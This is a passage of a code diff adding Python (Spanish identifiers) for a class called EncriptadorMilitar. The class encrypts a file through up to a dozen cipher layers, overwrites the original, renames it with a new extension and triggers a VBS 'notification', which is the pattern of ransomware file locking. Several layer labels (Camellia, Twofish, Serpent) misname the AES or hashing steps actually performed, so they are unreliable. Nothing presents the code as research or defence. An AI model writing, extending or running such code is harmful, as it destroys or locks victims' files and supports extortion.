+            xor_key = self._derive_key(file_master, b'xor_layer', b'initial_obfuscation', 32)
+            datos = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(datos))
+            claves_usadas.append(xor_key)
+            key_c1 = self._derive_key(file_master, b'chacha1', b'layer1', 32)
+            nonce_c1 = self._derive_key(file_master, b'nonce1', b'layer1', 16)
+            cipher_c1 = self.crypto['Cipher'](
+                self.crypto['algorithms'].ChaCha20(key_c1, nonce_c1),
+                mode=None,
+                backend=self.crypto['backend']
+            )
+            datos = cipher_c1.encryptor().update(datos)
+            mac_c1 = self._poly1305_mac(key_c1, datos)
+            claves_usadas.extend([key_c1, nonce_c1, mac_c1])
+            key_s = self._derive_key(file_master, b'salsa', b'layer2', 32)
+            nonce_s = self._derive_key(file_master, b'nonce2', b'layer2', 16)
+            cipher_s = self.crypto['Cipher'](
+                self.crypto['algorithms'].ChaCha20(key_s, nonce_s),
+                mode=None,
+                backend=self.crypto['backend']
+            )
+            datos = cipher_s.encryptor().update(datos)
+            claves_usadas.extend([key_s, nonce_s])
+            if num_capas >= 5:
+                key_a1 = self._derive_key(file_master, b'aes1', b'layer3', 32)
+                nonce_a1 = self._derive_key(file_master, b'nonce3', b'layer3', 12)
+                cipher_a1 = self.crypto['Cipher'](
+                    self.crypto['algorithms'].AES(key_a1),
+                    self.crypto['modes'].GCM(nonce_a1),
+                    backend=self.crypto['backend']
+                )
+                enc_a1 = cipher_a1.encryptor()
+                datos = enc_a1.update(datos) + enc_a1.finalize()
+                tag_a1 = enc_a1.tag
+                claves_usadas.extend([key_a1, nonce_a1, tag_a1])
+                key_cam = self._derive_key(file_master, b'camellia', b'layer4', 32)
+                nonce_cam = self._derive_key(file_master, b'nonce4', b'layer4', 16)
+                cipher_cam = self.crypto['Cipher'](
+                    self.crypto['algorithms'].AES(key_cam),
+                    self.crypto['modes'].CTR(nonce_cam),
+                    backend=self.crypto['backend']
+                )
+                datos = cipher_cam.encryptor().update(datos)
+                claves_usadas.extend([key_cam, nonce_cam])
+            if num_capas >= 8:
+                key_a2 = self._derive_key(file_master, b'aes2', b'layer5', 32)
+                iv_a2 = self._derive_key(file_master, b'iv5', b'layer5', 16)
+                padder = self.crypto['pad_module'].PKCS7(128).padder()
+                datos_padded = padder.update(datos) + padder.finalize()
+                cipher_a2 = self.crypto['Cipher'](
+                    self.crypto['algorithms'].AES(key_a2),
+                    self.crypto['modes'].CBC(iv_a2),
+                    backend=self.crypto['backend']
+                )
+                datos = cipher_a2.encryptor().update(datos_padded)
+                claves_usadas.extend([key_a2, iv_a2])
+                key_tw = self._derive_key(file_master, b'twofish', b'layer6', 32)
+                nonce_tw = self._derive_key(file_master, b'nonce6', b'layer6', 16)
+                for _ in range(3):
+                    cipher_tw = self.crypto['Cipher'](
+                        self.crypto['algorithms'].AES(key_tw),
+                        self.crypto['modes'].CTR(nonce_tw),
+                        backend=self.crypto['backend']
+                    )
+                    datos = cipher_tw.encryptor().update(datos)
+                claves_usadas.extend([key_tw, nonce_tw])
+                serpent_key = self._derive_key(file_master, b'serpent', b'layer7', 32)
+                chunk_size = min(64, len(datos))
+                for i in range(0, len(datos), chunk_size):
+                    chunk = datos[i:i+chunk_size]
+                    h = hashlib.blake2b(serpent_key + chunk, digest_size=len(chunk))
+                    datos = datos[:i] + bytes(a ^ b for a, b in zip(chunk, h.digest())) + datos[i+len(chunk):]
+                claves_usadas.append(serpent_key)
+            if num_capas >= 12:
+                blake_key = self._derive_key(file_master, b'blake', b'layer8', 64)
+                h = hashlib.blake2b(blake_key + datos, digest_size=64)
+                datos = h.digest() + datos
+                claves_usadas.append(blake_key)
+                key_c2 = self._derive_key(file_master, b'chacha2', b'layer9', 32)
+                nonce_c2 = self._derive_key(file_master, b'nonce9', b'layer9', 16)
+                cipher_c2 = self.crypto['Cipher'](
+                    self.crypto['algorithms'].ChaCha20(key_c2, nonce_c2),
+                    mode=None,
+                    backend=self.crypto['backend']
+                )
+                datos = cipher_c2.encryptor().update(datos)
+                claves_usadas.extend([key_c2, nonce_c2])
+                key_a3 = self._derive_key(file_master, b'aes3', b'layer10', 32)
+                nonce_a3 = self._derive_key(file_master, b'nonce10', b'layer10', 16)
+                cipher_a3 = self.crypto['Cipher'](
+                    self.crypto['algorithms'].AES(key_a3),
+                    self.crypto['modes'].CTR(nonce_a3),
+                    backend=self.crypto['backend']
+                )
+                datos = cipher_a3.encryptor().update(datos)
+                claves_usadas.extend([key_a3, nonce_a3])
+            claves_flat = self._flatten_keys(claves_usadas)
+            metadata = num_capas.to_bytes(1, 'big') + file_master + claves_flat
+            hmac_key = self._derive_key(MASTER_KEY_FIXED, b'hmac_salt', b'hmac_key', 64)
+            h = hmac.new(hmac_key, metadata + datos, hashlib.sha3_512)
+            firma = h.digest()
+            resultado = (
+                struct.pack('>I', len(metadata)) +
+                metadata +
+                datos +
+                firma
+            )
+            try:
+                with open(ruta, 'wb') as f:
+                    f.write(resultado)
+                nueva_ruta = ruta + self.ext
+                os.rename(ruta, nueva_ruta)
+                crear_vbs_notificacion(nueva_ruta)
+                return True
+            except:
+                return False
+        except:
+            return False
+    
+    def obtener_estadisticas(self):
+        return self.stats
+
+
+Encriptador = EncriptadorMilitar
+CRYPTO_OK = _import_crypto() is not None
